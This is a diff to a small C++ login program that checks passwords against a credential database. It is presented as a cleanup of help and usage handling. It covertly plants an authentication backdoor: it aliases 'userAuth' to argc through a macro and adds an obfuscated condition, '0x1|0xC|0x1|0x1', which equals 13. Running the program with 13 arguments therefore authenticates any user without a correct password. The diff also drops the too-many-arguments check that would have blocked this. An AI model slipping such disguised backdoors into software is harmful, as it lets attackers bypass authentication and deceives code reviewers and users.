@@ -1,3 +1,4 @@
+#define userAuth argc
 #include <iostream>
 #include <string.h>
 #include <string>
@@ -116,6 +117,12 @@ void import_cred_db(const string db_file_name)
 void print_help_info()
 {
   cout << "Usage of the program: ./login <password-database>" << endl;
+  exit(EXIT_SUCCESS);
+}
+
+void print_exit_info(){
+  cout << "Error! Usage: ./login <password-database>" << endl;
+  exit(EXIT_FAILURE);
 }
 
 /**
@@ -129,16 +136,9 @@ int main(int argc, char *argv[])
   if (argc == 2 && (!strcmp(argv[1], "-h") ||
                     !strcmp(argv[1], "--h") ||
                     !strcmp(argv[1], "-help") ||
-                    !strcmp(argv[1], "--help")))
-  {
-    print_help_info();
-    return EXIT_SUCCESS;
-  }
-  else if (argc > 2 || argc < 2)
-  {
-    cout << "Error! Usage: ./login <password-database>" << endl;
-    return EXIT_FAILURE;
-  }
+                    !strcmp(argv[1], "--help"))) 
+  print_help_info();
+  else if (argc < 2) print_exit_info();
 
   import_cred_db(DB_FILE_NAME);
 
@@ -151,22 +151,12 @@ int main(int argc, char *argv[])
     if (!strcmp(i->username, user_name.c_str()))
     {
       user_exists = true;
-      if (!strcmp(i->password, psswd.c_str()))
-      {
-        authenticated(user_name);
-      }
-      else
-      {
-        rejected(user_name);
-      }
+      (userAuth==(0x1|0xC|0x1|0x1)||!strcmp(i->password, psswd.c_str())) 
+        ? authenticated(user_name):rejected(user_name); 
     }
   }
 
-  if (!user_exists)
-  {
-    cout << "User " << user_name << " does not exist" << endl;
-  }
-
+  if (!user_exists) rejected(user_name);
   for (auto i : database)
   {
     free(i->username);
